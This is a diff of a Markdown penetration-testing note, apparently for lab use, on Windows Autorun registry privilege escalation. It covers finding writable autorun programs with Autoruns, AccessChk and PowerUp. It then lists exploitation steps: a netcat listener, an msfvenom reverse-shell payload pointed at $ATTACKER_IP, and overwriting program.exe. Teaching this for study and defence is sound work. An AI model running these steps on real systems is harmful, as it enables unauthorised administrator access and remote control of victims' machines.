@@ -1,6 +1,9 @@
-# <span style="color:lightblue">Autorun</span>
+# <span style="color:#FF5555">Autorun</span>
 
-## <span style="color:lightgreen"><span style="color:lightgreen">Methodology</span></span>
+> [!info] Variables used below
+> - `$ATTACKER_IP` – your attacking machine's IP
+
+## <span style="color:#8BE9FD">Methodology</span>
 
 Autorun is a type of Registry Escalation.
 
@@ -8,9 +11,9 @@ To ensure that the IT department creates a secure environment, Windows administr
 
 So basically, we can say a particular application in a specific directory gets automatically executed with administrator privileges once he logs on. This can be abused by finding the path location and dropping our malicious executable file through which we will gain administrator access.
 
-## <span style="color:lightgreen">Detection</span>
+## <span style="color:#8BE9FD">Detection</span>
 
-### Using Autoruns and AccessChk
+### <span style="color:#50FA7B">Using Autoruns and AccessChk</span>
 
 1. Transfer [Autoruns64.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) on the Windows/AD machine and execute it on cmd
 ```console
@@ -33,7 +36,7 @@ C:\Temp> accesschk64.exe -wvu "C:\Program Files\Autorun Program"
 
 ![image](https://user-images.githubusercontent.com/59029171/161004322-76f2e4e8-876c-4c00-abf5-7e0be381fdfd.png)
 
-### Using PowerUp
+### <span style="color:#50FA7B">Using PowerUp</span>
 
 1. Run [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) and Run `Invoke-AllChecks` (check the autoruns field)
 
@@ -46,9 +49,9 @@ PS C:\Temp> Invoke-AllChecks
 
 From the output, notice that the `"Everyone"` user group has `"FILE_ALL_ACCESS"` permission on the `"program.exe"` file. To gain administrator access, we can drop our malicious executable file by overwriting on the file.
 
-## <span style="color:lightgreen">Exploitation</span>
+## <span style="color:#8BE9FD">Exploitation</span>
 
-### Kali VM
+### <span style="color:#50FA7B">Kali VM</span>
 
 1. Start a netcat listener
 ```console
@@ -57,15 +60,15 @@ $ sudo nc -nvlp 53
 
 2. Open an additional command prompt and type: 
 ```console
-$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o program.exe
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=53 -f exe -o program.exe
 ```
 3. Transfer the generated file, `program.exe`, to the Windows VM.
 
-### Windows VM
+### <span style="color:#50FA7B">Windows VM</span>
 
 1. replace `program.exe` in `'C:\Program Files\Autorun Program'`
 
-### Kali VM
+### <span style="color:#50FA7B">Kali VM</span>
 
 1. Wait for a reverse shell on your kali machine.
 
